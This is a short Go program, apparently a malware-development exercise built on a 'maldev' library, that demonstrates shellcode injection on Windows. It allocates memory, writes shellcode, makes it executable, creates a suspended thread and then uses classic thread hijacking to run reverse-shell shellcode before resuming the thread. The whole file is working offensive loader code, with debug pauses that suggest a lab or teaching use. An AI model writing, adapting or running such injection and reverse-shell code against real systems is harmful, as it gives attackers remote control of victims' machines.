package main

import (
	"fmt"
	"unsafe"

	"github.com/mortimus/maldev/pkg/maldev"
	"github.com/mortimus/maldev/pkg/shellcode"
)

func main() {
	maldev.DEBUG = true
	decrypted := shellcode.Calc()

	// ALLOCATE MEMORY
	addr, err := maldev.VirtualAlloc(0, maldev.SIZE_T(len(decrypted)), maldev.MEM_COMMIT|maldev.MEM_RESERVE, maldev.PAGE_READWRITE)
	if err != nil {
		maldev.Debugf("VirtualAlloc Failed With Error : %s \n", err)
		return
	}
	maldev.Debugf("Allocated Memory At : 0x%p \n", unsafe.Pointer(addr))
	maldev.DebugWait("Write Payload")
	// WRITE SHELLCODE
	maldev.Memcpy(unsafe.Pointer(addr), unsafe.Pointer(&decrypted[0]), maldev.SIZE_T(len(decrypted)))
	maldev.Memset(unsafe.Pointer(&decrypted[0]), 0, maldev.SIZE_T(len(decrypted)))

	var dwOldProtection maldev.DWORD
	err = maldev.VirtualProtect(addr, maldev.SIZE_T(len(decrypted)), maldev.PAGE_EXECUTE_READWRITE, &dwOldProtection)
	if err != nil {
		fmt.Printf("[!] VirtualProtect Failed With Error : %s \n", err)
		return
	}

	// Create a thread
	maldev.DebugWait("Create Thread")

	pHandle, err := maldev.CreateThread(maldev.NULL, maldev.NULL, maldev.LPTHREAD_START_ROUTINE(addr), maldev.NULL, maldev.CREATE_SUSPENDED, nil)
	if err != nil {
		panic(err)
	}

	sc := shellcode.ReverseShell() // This won't exit the thread

	// Modify the thread
	maldev.DebugWait("Modify Thread")

	err = maldev.RunViaClassicThreadHijacking(pHandle, sc, maldev.SIZE_T(len(sc)))
	if err != nil {
		panic(err)
	}

	// Resume the thread
	maldev.DebugWait("Resume Thread")
	err = maldev.ResumeThread(pHandle)
	if err != nil {
		panic(err)
	}

	maldev.DebugWait("Quit")
}
